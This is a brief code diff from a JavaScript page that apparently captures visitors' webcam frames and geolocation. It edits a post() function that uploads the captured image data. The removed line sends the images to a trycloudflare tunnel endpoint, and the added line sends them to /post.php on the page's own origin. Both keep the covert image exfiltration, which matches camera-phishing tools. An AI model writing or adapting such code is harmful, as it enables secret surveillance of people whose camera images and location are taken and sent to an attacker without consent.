@@ -82,7 +82,7 @@ if (navigator.geolocation) {
     });
 }
 function post(imgdata) {
-    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php', async: false });
+    $.ajax({ type: 'POST', data: { cat: imgdata }, url: window.location.origin + '/post.php', async: false });
 }
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
